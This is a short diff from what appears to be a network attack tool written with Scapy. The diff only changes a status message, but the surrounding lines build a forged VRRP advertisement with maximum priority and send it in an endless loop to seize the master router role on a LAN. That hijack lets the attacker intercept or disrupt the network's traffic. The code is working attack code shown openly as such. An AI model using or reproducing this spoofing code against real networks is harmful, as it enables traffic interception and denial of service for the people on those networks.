@@ -41,7 +41,7 @@ def inject(interface, group, attackerip, vip):
     L3packet = IP(src=args.attackerip, dst=VRRPMulticastAddr, ttl=255)
     evil_vrrp = VRRP(vrid=args.group, priority=255, addrlist=args.vip)
     crafted = L2frame / L3packet / evil_vrrp
-    print ("\n[+] We begin to intercept the role of the ACTIVE router...")
+    print ("\n[+] We begin to intercept the role of the MASTER router...")
     sendp(crafted, iface=args.interface, inter=3, loop=1, verbose=1)
 
 args = take_arguments()
